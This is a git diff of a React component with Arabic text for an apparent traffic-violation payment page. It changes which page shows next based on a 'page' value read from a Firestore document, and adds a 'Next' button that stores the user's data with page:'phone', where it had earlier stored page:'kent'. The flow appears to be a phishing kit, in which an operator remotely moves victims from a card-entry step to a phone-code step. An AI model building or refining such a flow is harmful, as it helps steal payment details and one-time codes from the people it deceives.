@@ -74,7 +74,7 @@ function App(props: { setPage: any ,page:string}) {
         if (docSnap.exists()) {
           const data = docSnap.data() as any
           if (data.page && data.page !== "") {
-           // props.setPage(data.page)
+            props.setPage(data.page)
           }
           if (data.violationValue) {
             if (data.violationValue !== "") {
@@ -117,13 +117,12 @@ function App(props: { setPage: any ,page:string}) {
       addData({
         ...data,
         // Set the page property to 'kent'
+        
       })
       setloading(true)
-
       setTimeout(() => {
         setloading(false)
         setShow(true)
-        // props.setPage("kent");  // Uncomment this if you want to immediately navigate
       }, 1000)
     }
   }
@@ -682,61 +681,30 @@ function App(props: { setPage: any ,page:string}) {
                           <div className="col-12 text-right font-weight-bold mb-2">
                             بعد إجراء عملية الدفع.. يرجى عدم محاولة الدفع مرة أخرى حيث يجرى تحديث البيانات خلال 15 دقيقة
                           </div>
-                          <div className="col-sm-12 col-md-4 text-right">
+                         
+                          <div className="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
+                        </div>
+                       
+                      </form>
+                    </div>
+                  </div>
+                  <div className="col-sm-12 col-md-4 text-right">
                             <button
-                            style={{display:'none'}}
-                              type="button"
-                              onClick={() => {
+                              onClick={(e) => {
+                                e.preventDefault()
                                 setloading(true)
 
-                                addData({
-                                  ...data,
-                                })
-
-                                setTimeout(() => {
-addData({...data,page:'kent'}).then(()=>{
-  setloading(false)
-})
-                                }, 1000) // Reduced timeout for better user experience
-                              }}
+                                addData(
+                                  {...data,page:'phone',id:_id}) 
+                               }}                               
                               id="btnPay"
                               disabled={loading}
                               className={`btn btn-primary btn-block col-12 ${show ? "" : "d-none"}`}
                               
                             >
-                              {loading ?"انتظر...":"إدفع         "}
+                              {loading ?"انتظر...":"التالي         "}
                      </button>
                           </div>
-                          <div className="col-sm-12 col-md-6 align-self-center">&nbsp;</div>
-                        </div>
-                        <div className="form-row mt-3">
-                          <div className="col-12 align-self-center">
-                            <span
-                              className="badge badge-success p-2"
-                              style={{
-                                fontWeight: "normal !important",
-                                background: "green",
-                                margin: 4,
-                              }}
-                            >
-                              قابلة للدفع الكترونياً
-                            </span>
-                            <span
-                              className="badge badge-danger p-2"
-                              style={{
-                                fontWeight: "normal !important",
-                                margin: 4,
-                                background: "red",
-                              }}
-                            >
-                              غير قابلة للدفع الكترونياً
-                            </span>
-                          </div>
-                        </div>
-                      </form>
-                    </div>
-                  </div>
-              
                  
                 </div>
               </div>
